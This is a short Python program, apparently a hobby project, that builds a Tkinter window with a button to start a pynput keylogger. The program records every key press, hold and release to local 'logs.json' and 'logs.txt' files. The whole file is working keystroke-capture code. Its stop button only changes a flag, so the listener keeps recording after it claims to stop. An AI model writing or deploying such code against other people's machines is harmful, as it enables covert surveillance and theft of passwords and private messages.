import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import threading

root = tk.Tk()
root.geometry("300x300")
root.title("Keylogger")

key_list = []
x = False
key_strokes = ""
is_keylogger_running = False

def update_txt_file(key):
    with open('logs.txt', '+w') as key_strokes_file:
        key_strokes_file.write(key)

def update_json_file(key_list):
    with open('logs.json', '+w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
        update_json_file(key_list)
        key_strokes += str(key)
        update_txt_file(str(key_strokes))

def toggle_keylogger():
    global is_keylogger_running
    if is_keylogger_running:
        print("[-] Stopping Keylogger!")
        is_keylogger_running = False
    else:
        print("[+] Running Keylogger successfully!\n[!] Saving the key logs in 'logs.json'")
        is_keylogger_running = True
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()

    # Update the button text based on the keylogger state
    button_text.set("Stop Keylogger from capturing the keys" if is_keylogger_running else "Start Keylogger to capture keys")

button_text = StringVar()
button_text.set("Start Keylogger to capture keys")
button = Button(root, textvariable=button_text, command=toggle_keylogger)
button.pack(pady=20, padx=10)  # Use pack to center the button horizontally

root.mainloop()